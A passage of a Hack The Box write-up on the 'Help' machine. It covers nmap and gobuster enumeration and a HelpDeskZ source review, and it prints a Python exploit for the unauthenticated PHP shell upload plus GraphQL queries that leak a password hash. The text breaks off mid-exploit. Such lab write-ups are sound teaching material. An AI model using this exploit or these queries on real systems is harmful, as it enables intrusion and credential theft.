<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Help - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Help"><a href="#Hack-The-Box-Help" class="headerlink" title="Hack The Box - Help"></a>Hack The Box - Help</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called <code>HelpDeskZ</code>. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is <code>10.10.10.121</code> I added it to <code>/etc/hosts</code> as <code>help.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/help/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC help.htb</code><br><img src="/images/hackthebox/help/1.png" alt=""><br>We got <code>ssh</code> on port 22 and <code>http</code> on two ports : 80 and 3000. What’s running on port 80 is an <code>Apache2</code> server and on port 3000 is <code>Node.js Express Framework</code>.</p>
<h2 id="HTTP-Initial-Enumeration"><a href="#HTTP-Initial-Enumeration" class="headerlink" title="HTTP Initial Enumeration"></a>HTTP Initial Enumeration</h2><p>On port 80 there’s just the default <code>Apache</code> index page :<br><img src="/images/hackthebox/help/2.png" alt=""><br>So I ran <code>gobuster</code> and got these results :<br><code>gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;help.htb&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;06&#x2F;07 13:03:25 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br><span class="line">&#x2F;javascript (Status: 301)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x2F;support (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;06&#x2F;07 13:05:25 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>I went to <code>/support</code> and there was a web application called <code>HelpDeskZ</code> :<br><img src="/images/hackthebox/help/3.png" alt=""></p>
<h2 id="File-Upload-Vulnerability"><a href="#File-Upload-Vulnerability" class="headerlink" title="File Upload Vulnerability"></a>File Upload Vulnerability</h2><p>A quick search and I found an <a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener">unauthenticated file upload vulnerability</a> that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload <code>php</code> files because they are allowed by default.</p>
<blockquote>
<p>HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.<br>The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -<a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener">exploit-db</a></p>
</blockquote>
<p>I wanted to test if I can really upload <code>php</code> so I went to <code>Submit a Ticket</code> and I attached a test file :<br><img src="/images/hackthebox/help/4.png" alt=""><br><img src="/images/hackthebox/help/5.png" alt=""><br><img src="/images/hackthebox/help/6.png" alt=""><br>And I got <code>File is not allowed.</code><br>Luckily <code>HelpDeskZ</code> is an open-source application so I checked the source on <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener">github</a>.<br>The script that handles tickets submissions is called <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php" target="_blank" rel="noopener"><code>new-ticket.php</code></a>. It can be found in <code>includes/parser</code>.<br>Here’s the part for the attachments :<br><img src="/images/hackthebox/help/7.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($attachments))&#123;</span><br><span class="line">		$save_dir = UPLOAD_DIR;</span><br><span class="line">		<span class="keyword">foreach</span>($attachments <span class="keyword">as</span> $attachment) &#123;</span><br><span class="line">		  <span class="comment">// get the attachment name</span></span><br><span class="line">		  $filename = $attachment-&gt;filename;</span><br><span class="line">		  <span class="comment">// write the file to the directory you want to save it in</span></span><br><span class="line">		  <span class="keyword">if</span> ($fp = fopen($save_dir.$filename, <span class="string">'w'</span>)) &#123;</span><br><span class="line">			<span class="keyword">while</span>($bytes = $attachment-&gt;read()) &#123;</span><br><span class="line">			  fwrite($fp, $bytes);</span><br><span class="line">			&#125;</span><br><span class="line">			fclose($fp);</span><br><span class="line">		  &#125;</span><br><span class="line">			</span><br><span class="line">		  $filesize = @filesize(UPLOAD_DIR.$filename);</span><br><span class="line">		  <span class="keyword">if</span>($filesize)&#123;</span><br><span class="line">			  $fileinfo = <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $filename, <span class="string">'size'</span> =&gt; $filesize);</span><br><span class="line">			  $fileverification = verifyAttachment($fileinfo);</span><br><span class="line">			  <span class="keyword">if</span>($fileverification[<span class="string">'msg_code'</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">				$ext = pathinfo($filename, PATHINFO_EXTENSION);</span><br><span class="line">				$filename_encoded = md5($filename.time()).<span class="string">"."</span>.$ext;</span><br><span class="line">				$data = <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $filename, <span class="string">'enc'</span> =&gt; $filename_encoded, <span class="string">'filesize'</span> =&gt; $filesize, <span class="string">'ticket_id'</span> =&gt; $ticketid, <span class="string">'msg_id'</span> =&gt; $message_id, <span class="string">'filetype'</span> =&gt; $attachment-&gt;content_type);</span><br><span class="line">				$db-&gt;insert(TABLE_PREFIX.<span class="string">"attachments"</span>, $data);</span><br><span class="line">				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.<span class="string">'tickets/'</span>.$filename_encoded);</span><br><span class="line">			  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				unlink(UPLOAD_DIR.$filename);</span><br><span class="line">			  &#125;</span><br><span class="line">		  &#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>It takes the file and uploads it then there’s an <code>if</code> statement that checks the result of passing <code>$fileinfo</code> to a function called <code>verifyAttachment</code>. If the function returned <code>0</code> it will rename the file. If it’s not <code>0</code> it will delete the file (<code>unlink(UPLOAD_DIR.$filename)</code>) . This function can be found in <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php" target="_blank" rel="noopener"><code>functions.php</code></a> in <code>includes/</code>.<br><code>verifyAttachment()</code> :<br><img src="/images/hackthebox/help/8.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyAttachment</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;	</span><br><span class="line">	$namepart = explode(<span class="string">'.'</span>, $filename[<span class="string">'name'</span>]);</span><br><span class="line">	$totalparts = count($namepart)<span class="number">-1</span>;</span><br><span class="line">	$file_extension = $namepart[$totalparts];</span><br><span class="line">	<span class="keyword">if</span>(!ctype_alnum($file_extension))&#123;</span><br><span class="line">		$msg_code = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$filetype = $db-&gt;fetchRow(<span class="string">"SELECT count(id) AS total, size FROM "</span>.TABLE_PREFIX.<span class="string">"file_types WHERE type='"</span>.$db-&gt;real_escape_string($file_extension).<span class="string">"'"</span>);</span><br><span class="line">		<span class="keyword">if</span>($filetype[<span class="string">'total'</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">			$msg_code = <span class="number">2</span>;</span><br><span class="line">		&#125;<span class="keyword">elseif</span>($filename[<span class="string">'size'</span>] &gt; $filetype[<span class="string">'size'</span>] &amp;&amp; $filetype[<span class="string">'size'</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			$msg_code = <span class="number">3</span>;</span><br><span class="line">			$misc = formatBytes($filetype[<span class="string">'size'</span>]);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;	</span><br><span class="line">			$msg_code = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$data = <span class="keyword">array</span>(<span class="string">'msg_code'</span> =&gt; $msg_code, <span class="string">'msg_extra'</span> =&gt; $misc);</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return <code>0</code> and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : <code>File is not allowed.</code> is meaningless.<br>If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time.<br>If we take a look at the exploit :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: &#123;&#125; [baseUrl] [nameOfUploadedFile]"</span>.format(sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">helpdeskzBaseUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">fileName = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">currentTime = int(time.time())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">300</span>):</span><br><span class="line">    plaintext = fileName + str(currentTime - x)</span><br><span class="line">    md5hash = hashlib.md5(plaintext).hexdigest()</span><br><span class="line"></span><br><span class="line">    url = helpdeskzBaseUrl+md5hash+<span class="string">'.php'</span></span><br><span class="line">    response = requests.head(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"found!"</span></span><br><span class="line">        <span class="keyword">print</span> url</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Sorry, I did not find anything"</span></span><br></pre></td></tr></table></figure>
<p>We can solve this problem by iterating over a higher range than 300 : <code>for x in range(0, 300)</code><br>This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours. </p>
<h2 id="Node-js-Getting-Credentials"><a href="#Node-js-Getting-Credentials" class="headerlink" title="Node.js, Getting Credentials"></a>Node.js, Getting Credentials</h2><p>We saw earlier that port 3000 was open and running <code>Node.js Express framework</code> and we haven’t looked at that yet.<br><img src="/images/hackthebox/help/9.png" alt=""><br>By going to <code>http://help.htb:3000/</code> I got this response of a message saying : <code>&quot;Hi Shiv, To get access please find the credentials with given query&quot;</code>, I tried <code>/test</code> and got this :<br><img src="/images/hackthebox/help/10.png" alt=""><br>tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about <code>node.js</code>, <code>node.js</code> queries and other related stuff. After a lot of attempts to find something when I tried <code>/graphql</code> I got this response :<br><img src="/images/hackthebox/help/11.png" alt=""><br>So I added <code>?query</code> and got a syntax error :<br><code>http://help.htb:3000/graphql?query</code><br><img src="/images/hackthebox/help/12.png" alt=""><br>That’s fine, I tried requesting a query, for example <code>user</code> :<br><code>http://help.htb:3000/graphql?query={user}</code> :<br><img src="/images/hackthebox/help/13.png" alt=""><br>It says that <code>user</code> must have a selection of subfields so I tried <code>username</code> :<br><code>http://help.htb:3000/graphql?query={user{username}}</code> :<br><img src="/images/hackthebox/help/14.png" alt=""><br>Great, let’s get the password :<br><code>http://help.htb:3000/graphql?query={user{password}}</code> :<br><img src="/images/hackthebox/help/15.png" alt=""><br>I used <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation</a> to crack the hash and got this password :<br><code>5d3c93182bb20f07b994a7f617e99cff</code> : <code>godhelpmeplz</code><br>Now we have the credentials : <code>helpme@helpme.com : godhelpmeplz</code></p>
<h2 id="File-Upload-Exploitation-Reverse-Shell-and-User-Flag"><a href="#File-Upload-Exploitation-Reverse-Shell-and-User-Flag" class="headerlink" title="File Upload Exploitation, Reverse Shell and User Flag"></a>File Upload Exploitation, Reverse Shell and User Flag</h2><p>I edited the path of the uploads in the exploit, instead of <code>helpdeskzBaseUrl+md5hash+&#39;.php&#39;</code> I made it :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">helpdeskzBaseUrl+<span class="string">'/uploads/tickets/'</span>+md5hash+<span class="string">'.php'</span></span><br></pre></td></tr></table></figure>
<p>I got that path from the <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener">github repository</a>).<br>Exploit after edits :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: &#123;&#125; [baseUrl] [nameOfUploadedFile]"</span>.format(sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">helpdeskzBaseUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">fileName = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">currentTime = int(time.time())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">300</span>):</span><br><span class="line">    plaintext = fileName + str(currentTime - x)</span><br><span class="line">    md5hash = hashlib.md5(plaintext).hexdigest()</span><br><span class="line"></span><br><span class="line">    url = helpdeskzBaseUrl+<span class="string">'/uploads/tickets/'</span>+md5hash+<span class="string">'.php'</span></span><br><span class="line">    response = requests.head(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        